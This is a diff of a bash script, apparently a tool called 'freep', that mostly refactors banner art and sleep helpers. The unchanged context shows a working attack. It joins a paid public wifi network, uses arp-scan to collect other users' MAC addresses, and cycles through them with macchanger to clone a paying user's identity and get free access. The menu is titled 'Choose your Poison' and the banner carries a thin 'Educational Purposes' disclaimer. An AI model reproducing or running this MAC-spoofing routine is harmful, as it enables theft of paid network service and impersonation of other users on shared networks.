@@ -5,11 +5,11 @@
 #Declaring variables
 red='\033[1;31m'
 Yellow='\033[1;33m'
-blue='\033[1;34m'
-purple='\033[1;35m'
+blue='\033[7;34m'
+export purple='\033[1;35m'
 reset='\033[0m'
 #Dancing panda Variables
-purple_panda='\033[6;35m'
+export purple_panda='\033[6;35m'
 
     #configuration files & data files
 online="online_users.txt"
@@ -18,61 +18,61 @@ complete_users="users.txt"
     #file paths shortened for no reason
 config_path="/tmp/freep"
 previous_config_path="/tmp/freep/freepcollections"
-#freepwaifu new logo
-banner(){
-echo -e ${purple_panda}"
+#freepwaifu new logo\
+function banner {
+  local epic=$1
+  local epic_say=$2
+echo -e ${epic}"
                     |───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───|
 █▀▀ █▀█ █▀▀ █▀▀ █▀█ |───█▒▒░░░░░░░░░▒▒█───|
 █▀░ █▀▄ ██▄ ██▄ █▀▀ |────█░░█░░░░░█░░█────|
                     |─▄▄──█░░░▀█▀░░░█──▄▄─|  █░█░█ ▄▀█ █ █▀▀ █░█
-                    |█░░█─▀▄░░░░░░░▄▀─█░░█|  ▀▄▀▄▀ █▀█ █ █▀░ █▄█
-
-                loading program..................................
-                    
-"${reset}                   
+                    |█░░█─▀▄░░░░░░░▄▀─█░░█|  ▀▄▀▄▀ █▀█ █ █▀░ █▄█"${reset}
+        echo ""
+        echo -e ${Yellow} "$epic_say "${reset}
+        echo -e ${blue}"＊${reset}.${purple_panda} ᐅᐅ"${reset}
 }
 #length time functions
-drowsy_1(){
-    sleep 1
+function drowsy_1 {
+    local drunk=$1
+    sleep ${drunk} 
 }
-drowsy_2(){
-    sleep 5
-}
-drowsy_3(){
-    sleep 3
-}
-banner
+
+epic="$purple_panda"
+banner "$epic" "＊ ＊ ＊ Loading ＊ ＊ ＊" 
 #Temporary file management written poorly but exists for some reason
 if [[ -d $config_path ]]; then
     echo -e "[✔] ${Yellow} located alien spacecship....${reset}"
-    drowsy_1
+    drowsy_1 "1"
     if [[ -f $config_path/$total_users ]]; then
         echo -e "[✔] ${Yellow} Found and killed alien life.. ${reset}"
         rm -rf $config_path/$total_users
-        drowsy_1
+        drowsy_1 "1"
     else
+        drowsy_1 "1"
         echo -e "[◉]${Yellow} Alien life not found ${reset}"
     fi
      if [[ -f $config_path/$complete_users ]]; then
         echo -e "[✔] ${Yellow} Found and killed alien life.. ${reset}"
         rm -rf $config_path/$complete_users
-        drowsy_1
+        drowsy_1 "1"
     else
+        drowsy_1 "1"
         echo -e "[◉]${Yellow} Alien life not found ${reset}"
     fi
      if [[ -f $config_path/$online ]]; then
         echo -e "[✔] ${Yellow} Found cute alien , storing her... ${reset}"
         cat "$config_path/$online" >> $previous_config_path/$online
         rm -rf $config_path/$online
-        drowsy_1
+        drowsy_1 "1"
     else
+        drowsy_1 "1"
         echo -e "[◉]${Yellow} Alien life not found ${reset}"
-        drowsy_1
     fi
 else
     mkdir {"$config_path/","$previous_config_path/"}
     echo -e "${Yellow} ..Initialised configuration files ${reset}"
-    drowsy_1
+    drowsy_1 "1"
     clear
 fi   
 #Userfull functions
@@ -103,7 +103,7 @@ wifi_spoof_tool(){
     echo -e "${Yellow} Enter the public paid wifi name....${reset}"
     read wifiname_1
     nmcli d wifi connect "${wifiname_1}" &> /dev/null
-    drowsy_2
+    drowsy_1 "5"
     sudo arp-scan -l | awk '/.*:.*:.*:.*:.*:.*/{print $2}' >> $config_path/$total_users
     tail -n +4 $config_path/$total_users >> $config_path/$complete_users
     tots=$(wc -l $config_path/$complete_users | awk '{print $1}')
@@ -113,14 +113,14 @@ wifi_spoof_tool(){
     do
         get_interface
         disable_wifi_iface
-        drowsy_1
+        drowsy_1 "1"
         sudo macchanger --mac=${user} $interface &>/dev/null
-        drowsy_1
+        drowsy_1 "1"
         enable_wifi_iface
 	#sudo macchanger --show $interface
-        drowsy_3
+        drowsy_1 "3"
         nmcli d wifi connect "${wifiname_1}" &>/dev/null
-        drowsy_2
+        drowsy_1 "5"
         Routing_to=$(ip route show default | awk '/default/ {print $3}')
         echo -e "${Yellow} [~]${reset} Checking interent connectivity on ${Yellow} $user ${reset} ... Route:_ ${Yellow} $Routing_to ${reset}"
 		PING_TARGET="google.com"
@@ -152,19 +152,9 @@ wifi_spoof_tool(){
 		fi
     fi
 }
-banner_screen(){
-echo -e ${purple}"
-                    |───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───|
-█▀▀ █▀█ █▀▀ █▀▀ █▀█ |───█▒▒░░░░░░░░░▒▒█───|
-█▀░ █▀▄ ██▄ ██▄ █▀▀ |────█░░█░░░░░█░░█────|
-                    |─▄▄──█░░░▀█▀░░░█──▄▄─|  █░█░█ ▄▀█ █ █▀▀ █░█
-                    |█░░█─▀▄░░░░░░░▄▀─█░░█|  ▀▄▀▄▀ █▀█ █ █▀░ █▄█
-                    
-"${reset}
-echo -e ${Yellow} "  │   ©Yada 2022 --Made with Love For Educational Purposes        "${reset}                   
-}
 clear
-banner_screen
+epic="$purple"
+banner "$epic" "© Yada 2022 --Made with Love For Educational Purposes" 
 cat << EOF
 Choose your Poison:
     1. Scan for live internet user
